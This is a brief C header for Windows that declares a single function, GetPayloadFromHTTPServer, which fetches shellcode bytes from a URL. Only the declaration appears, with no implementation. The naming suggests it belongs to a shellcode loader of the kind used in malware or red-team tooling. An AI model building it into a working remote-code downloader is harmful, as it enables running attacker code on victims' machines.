#ifndef GETFROMREMOTE_H

#define GETFROMREMOTE_H
#include <Windows.h>

BOOL GetPayloadFromHTTPServer(IN LPCSTR Url, IN PBYTE* ppShellcodeBytes, IN SIZE_T* psShellcodeBytes);

#endif
